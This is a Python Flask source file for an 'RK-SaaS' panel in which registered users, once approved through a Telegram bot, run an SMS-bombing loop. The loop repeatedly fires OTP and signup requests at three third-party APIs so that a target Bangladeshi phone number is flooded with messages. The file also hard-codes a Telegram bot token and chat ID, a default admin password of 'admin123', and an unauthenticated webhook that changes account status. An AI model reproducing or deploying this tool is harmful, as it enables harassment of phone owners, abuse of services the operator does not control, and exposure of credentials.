import requests, threading, os, time, json, sqlite3
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from requests_toolbelt.multipart.encoder import MultipartEncoder
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_ULTRA_SaaS_FINAL_V3"

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" # আপনার চ্যাট আইডি সেট করা হয়েছে
ADMIN_USERNAME = "admin"

# API URLS
ILYN_URL = "https://api.ilyn.global/auth/signup"
SHOP_URL = "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber="
SIM_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
BOUNDARY = "----WebKitFormBoundaryRKSTAR12345"

# ---------- DATABASE ----------
def db_query(query, params=(), fetch=False):
    conn = sqlite3.connect('system.db')
    cursor = conn.cursor()
    cursor.execute(query, params)
    data = cursor.fetchall() if fetch else None
    conn.commit()
    conn.close()
    return data

def init_db():
    db_query('''CREATE TABLE IF NOT EXISTS users 
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, role TEXT, status TEXT)''')
    try:
        db_query("INSERT INTO users (username, password, role, status) VALUES (?, ?, ?, ?)", 
                 (ADMIN_USERNAME, generate_password_hash("admin123"), "admin", "approved"))
    except: pass

init_db()

# ---------- TELEGRAM INLINE CONTROL ----------
def send_tg_with_buttons(username):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": MY_CHAT_ID,
        "text": f"🔔 New Registration!\nUser: {username}\nAction Required:",
        "reply_markup": json.dumps({
            "inline_keyboard": [
                [
                    {"text": "✅ Approve", "callback_data": f"approve_{username}"},
                    {"text": "🚫 Ban", "callback_data": f"ban_{username}"}
                ]
            ]
        })
    }
    try: requests.post(url, json=payload)
    except: pass

# ---------- WEBHOOK FOR TG BUTTONS ----------
@app.route('/tg_webhook', methods=['POST'])
def tg_webhook():
    data = request.json
    if "callback_query" in data:
        callback = data["callback_query"]
        action_data = callback["data"] # e.g., "approve_raihan"
        action, target_user = action_data.split('_')
        
        status = "approved" if action == "approve" else "banned"
        db_query("UPDATE users SET status = ? WHERE username = ?", (status, target_user))
        
        # আপডেট মেসেজ পাঠানো
        callback_id = callback["id"]
        requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/answerCallbackQuery", 
                      json={"callback_query_id": callback_id, "text": f"User {target_user} is {status}!"})
        
        requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/editMessageText", 
                      json={
                          "chat_id": MY_CHAT_ID,
                          "message_id": callback["message"]["message_id"],
                          "text": f"✅ Done!\nUser: {target_user} has been {status}."
                      })
    return "OK"

# ---------- BOMBING LOGIC ----------
active_sessions = {}

def bombing_task(username, phone, limit):
    key = f"{username}_{phone}"
    while key in active_sessions:
        if active_sessions[key]['total'] >= limit:
            del active_sessions[key]
            break
        if active_sessions[key]['status'] == 'running':
            try:
                p_json = json.dumps({"code": "BD", "number": phone}, separators=(",", ":"))
                enc = MultipartEncoder(fields={"phone": p_json, "provider": "sms"}, boundary=BOUNDARY)
                requests.post(ILYN_URL, headers={"Content-Type": enc.content_type}, data=enc, timeout=5)
                requests.get(SHOP_URL + phone, timeout=5)
                requests.post(SIM_URL, json={"msisdn": phone}, timeout=5)
            except: pass
            active_sessions[key]['total'] += 3
            time.sleep(1)
        else: time.sleep(2)

# ---------- WEB INTERFACE (HTML) ----------
LOGIN_HTML = '''
<body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;">
    <div style="border:1px solid #0f0; display:inline-block; padding:30px;">
        <h2>RK-SaaS LOGIN</h2>
        <form method="POST">
            <input name="u" placeholder="Username" required style="display:block;margin:10px auto;padding:10px;background:#111;border:1px solid #0f0;color:#fff;"><br>
            <input name="p" type="password" placeholder="Password" required style="display:block;margin:10px auto;padding:10px;background:#111;border:1px solid #0f0;color:#fff;"><br>
            <button style="width:100%;padding:10px;background:#0f0;font-weight:bold;cursor:pointer;">LOGIN</button>
        </form>
        <p>New? <a href="/register" style="color:cyan;">Register Here</a></p>
    </div>
</body>
'''

# ---------- ROUTES ----------
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user, pwd = request.form['u'], request.form['p']
        res = db_query("SELECT password, role, status FROM users WHERE username = ?", (user,), fetch=True)
        if res and check_password_hash(res[0][0], pwd):
            if res[0][2] == 'pending': return "<h2>Access Pending! Wait for RK RaiHaN to Approve.</h2>"
            if res[0][2] == 'banned': return "<h2>You are BANNED from this system!</h2>"
            session['user'], session['role'] = user, res[0][1]
            return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_HTML)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        user, pwd = request.form['u'], generate_password_hash(request.form['p'])
        try:
            db_query("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'user', 'pending')", (user, pwd))
            send_tg_with_buttons(user) # বাটসহ মেসেজ যাবে
            return "<h2>Registration Sent! Admin will notify you.</h2>"
        except: return "<h2>Username already exists!</h2>"
    return render_template_string(LOGIN_HTML.replace("LOGIN", "REGISTER"))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return f"<h1>Welcome {session['user']}</h1><p>Dashboard logic here...</p><a href='/logout'>Logout</a>"

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    # Webhook সেটআপ করার কমান্ড (রেন্ডার ইউআরএল অনুযায়ী)
    # requests.get(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/setWebhook?url=YOUR_RENDER_URL/tg_webhook")
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
